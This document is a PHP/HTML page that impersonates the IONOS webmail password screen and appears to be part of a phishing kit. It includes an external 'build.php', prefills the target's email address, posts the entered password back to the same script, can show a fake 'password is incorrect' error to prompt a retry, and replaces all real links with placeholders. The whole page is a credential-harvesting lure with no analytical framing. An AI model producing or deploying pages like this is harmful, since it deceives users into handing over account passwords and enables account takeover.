<?php include '../build.php' ?>
<html data-exos-theme="ionos">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <head>
    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/exos.min.css">
    <meta name="robots" content="noindex">   
    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.com/image/favicon.ico">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <meta name="description" content="Webmail Login: Access your email mailbox and read your email online with Webmail.">
    <link rel="stylesheet" href="https://id.ionos.com/style/main.min.css">


    <link type="text/css" rel="stylesheet" href="//frontend-services.ionos.com/t/inpagelayer/css/inpagelayer.css?v=5.2.1">
    <link type="text/css" rel="stylesheet" href="//frontend-services.ionos.com/t/statuspage/css/statuspage.css?v=3.1.0">
    <link rel="stylesheet" type="text/css" href="//var.uicdn.net/shopsshort/privacy/v1/bundle.css">
    <link type="text/css" rel="stylesheet" href="//frontend-services.ionos.com/t/navi/css/navigation.css?v=6.17.8">
</head>

    <body class="oao-pi-nolayer oao-pi-with-navigation">
    <link rel="stylesheet" href="https://id.ionos.com/style/starter-main.min.css">

    <div class="page-content"><span class="page-transition__indicator-bar"></span>

  <div class="oao-navi-navigation oao-navi-light oao-navi-nl oao-navi-items-right-2 oao-navi-finished" role="banner">
    <div class="oao-navi-top"></div><div class="oao-navi-left">
      <div class="oao-navi-application-name"><nav role="navigation" aria-label="Primary"><ul class="oao-navi-sub-left"><li class="oao-navi-flyout-container oao-navi-flyout-application_switch " role="menu"><a class="oao-navi-flyout-item oao-navi-app-name oao-navi-app-nl oao-navi-as-no-icon" href="#" tabindex="-1"><span class="oao-navi-app-logo" tabindex="0"></span><span class="oao-navi-app-name-span-nl" tabindex="0">Webmail Login</span></a></li></ul></nav>
      </div>
    </div>
    
  <div class="oao-navi-center"><ul role="menu"><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-big" role="menu"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" id="oao-search-big" role="button" tabindex="0" aria-label="Open search" aria-haspopup="true" aria-expanded="false"><!--?xml version="1.0" encoding="utf-8"?-->
<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve" aria-hidden="true" focusable="false">
<g id="dark">
	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
</g>
</svg>
</a><div class="oao-navi-input-container oao-navi-speech" id="oao-navi-speech-big"><label class="oao-navi-search-label" for="search-input-label-big">Search for features, domains, and help</label><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" id="search-input-label-big" placeholder="Search for features, domains, and help" autocomplete="off" aria-label="" ><i class="oao-navi-search-mic" tabindex="0" aria-label="Turn on microphone" role="button"></i></div></div></li></ul></div><div class="oao-navi-right"><nav role="navigation" aria-label="Secondary"><ul class="oao-navi-sub" role="menu"><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-small" role="menu"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" id="oao-search-small" role="button" tabindex="0" aria-label="Open search" aria-haspopup="true" aria-expanded="false"><!--?xml version="1.0" encoding="utf-8"?-->
<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve" aria-hidden="true" focusable="false">
<g id="dark">
	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
</g>
</svg>
</a><div class="oao-navi-input-container oao-navi-speech" id="oao-navi-speech-small"><label class="oao-navi-search-label" for="search-input-label-small">Search for features, domains, and help</label><button class="oao-navi-search-icon" role="button" aria-label="Close search" tabindex="0"></button><input class="oao-navi-search-input" type="search" id="search-input-label-small" placeholder="Search for features, domains, and help" autocomplete="off" aria-label=""><i class="oao-navi-search-mic" tabindex="0" aria-label="Turn on microphone" role="button"></i></div></div></li><li class="oao-navi-flyout-container oao-navi-flyout-support " role="menu"><div class="oao-navi-simple-tooltip">Help &amp; contact</div><a class="oao-navi-flyout-item" id="oao-support" data-target-id="oao-navi-support-button" aria-label="Help &amp; contact" tabindex="0" role="button"><svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 26 26" aria-hidden="true" focusable="false">
	<path class="oao-navi-icon-fill" d="M1.7,25.5c-0.5,0-0.8-0.3-0.9-0.4c-0.3-0.4-0.4-0.9-0.1-1.5C1.5,21.4,2.4,19,2.8,18c-0.1-0.1-0.2-0.3-0.3-0.4
	c-1.3-1.8-2-3.8-2-6c0-6.1,5.6-11,12.5-11c7,0,12.5,4.8,12.5,11c0,6.1-5.6,11-12.5,11c-1.5,0-2.7-0.2-3.7-0.5C9.2,22,9,22,8.9,21.9
	c-0.6,0.3-2,1-3,1.5c-2.6,1.4-3.4,1.8-3.7,1.9C2,25.4,1.9,25.5,1.7,25.5z"></path>
	<g class="oao-navi-icon-main">
		<path class="oao-navi-icon-invert" d="M12.9,13.3c-0.6,0-1.1-0.5-1.1-1.1c0-1.7,1.1-2.5,1.4-2.7c0.6-0.4,0.8-0.8,0.8-1c0-0.6-0.2-0.8-0.2-0.8
			c-0.3-0.2-0.7-0.3-0.8-0.3c-0.8,0-1,0.4-1.1,0.7c-0.1,0.6-0.7,1-1.2,0.9s-1-0.6-0.9-1.2C9.9,7,10.7,5.3,13,5.3c0.2,0,1.4,0,2.4,0.9
			c0.4,0.4,0.9,1.1,0.9,2.3c0,0.7-0.3,1.8-1.7,2.8c-0.1,0.1-0.5,0.3-0.5,0.9C14,12.8,13.6,13.3,12.9,13.3z"></path>
		<path class="oao-navi-icon-invert" d="M13,17.7c0.7,0,1.2-0.5,1.2-1.2s-0.5-1.2-1.2-1.2s-1.2,0.5-1.2,1.2S12.3,17.7,13,17.7z"></path>
		<path d="M1.2,26c-0.5,0-0.8-0.3-1-0.4c-0.3-0.4-0.4-1-0.1-1.5c0.9-2.3,1.8-4.8,2.2-5.8c-0.1-0.1-0.2-0.3-0.3-0.4
			c-1.4-1.9-2-4-2-6.2C0,5.2,5.8,0.1,13,0.1c7.3,0,13,5,13,11.5C26,17.8,20.2,23,13,23c-1.6,0-2.8-0.2-3.9-0.5
			c-0.1,0-0.2-0.1-0.4-0.1c-0.6,0.3-2.1,1-3.1,1.6c-2.7,1.4-3.5,1.8-3.8,1.9C1.6,25.9,1.4,26,1.2,26z M13,2.2
			c-5.9,0-10.8,4.3-10.8,9.3c0,1.8,0.5,3.5,1.6,5C4,16.7,4.2,17,4.4,17.2c0.5,0.5,0.5,0.6-1.4,5.7c0.6-0.3,1.2-0.6,1.7-0.9
			c4-2.1,4-2.1,4.6-1.8c0.2,0.1,0.4,0.2,0.6,0.2c0.9,0.3,1.8,0.4,3.2,0.4c5.9,0,10.8-4.3,10.8-9.3C23.8,6.3,19.1,2.2,13,2.2z"></path>
	</g>
</svg>
</a></li></ul></nav></div></div>



      <main>

        <section class="page-section page-section--default page-section--short">
          <div class="page-section__block">

          
      <div class="sheet">
        <section class="sheet__section sheet__section--default">
          <ul>
            <li class="stripe stripe--cropped">
              <div class="stripe__item">
                <img class="stripe__visual" src="https://id.ionos.com/image/password.svg" height="58" width="auto">
              </div>
              <div class="stripe__item">
                <h1 class="headline stripe__element">Enter password</h1>
              </div>
            </li>
          </ul>
        </section>

        <section class="sheet__section sheet__section--default">
          
  <div class="container-current-identifier">
      <div class="current-identifier">
        <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip" href="#" data-tooltip="Back to login">
          <i class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"></i>
        </a>
        <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" href="#" data-tooltip="Back to login">
          <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
          <span class="ghost-button__text"><?php echo htmlspecialchars($decoded); ?></span>
        </a>
      </div>
  </div>
          <form name="login" method="post" action="" novalidate="">
            <input type="hidden" name="login" value="ionos">
            <input type="email" class="hidden" name="user" id="username" tabindex="-1" spellcheck="false" value="<?php echo htmlspecialchars($decoded); ?>" autocomplete="off">
            <ul>
              <li class="form-stripe">
                <label class="label" for="password">Password</label>
                <span class="input-text-group input-text-group--empty">
                  <input type="text" class="input-text" required="true" tabindex="1" autofocus="" autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="pass" value="">
                 
                </span>
                <p class="input-byline input-byline--error" style="<?php echo $error; ?>">The password is incorrect.</p>
                <p class="input-byline">
                  <a class="link oao-pi-open-in-flyin" target="_blank" href="#">Forgot Your Password?</a>
                </p>
                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="#">private browsing mode</a>.</p></li>
              <li class="form-stripe form-stripe--actions">
                <button class="button button--primary button--full-width button--with-loader" type="submit" id="button--with-loader" tabindex="2">Next</button>
              </li>
            </ul>
          </form>
        </section>
      </div>
          </div>
        </section>
      </main>
    </div>

  <footer class="page-footer">
    <div class="page-footer__block">

      <section class="page-footer__section page-footer__section--last">

        <div class="page-footer__section-item">
          <div class="oao-statuspage-overall-status page-footer__status"><a class="oao-statuspage-overall-state-none" target="_blank" href="#">All Systems Operational</a></div>
        </div>

        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">&copy; 2026<a class="page-footer__link" target="_blank" href="#">&nbsp;IONOS &nbsp;Inc.</a>
        </div>
        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
        <a class="page-footer__link" target="_blank" href="#">Privacy Policy</a> - <a class="page-footer__link" target="_blank" href="#">T&amp;Cs</a>
        </div>
        </section>
    </div>
  </footer>
  <div>    
  </div>
    <div class="page-transition__blocker">
        <div class="page-transition__loading-spin loading-spin">
    </div>
</div>
<div class="static-overlay__blocker static-overlay__blocker--hidden"></div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>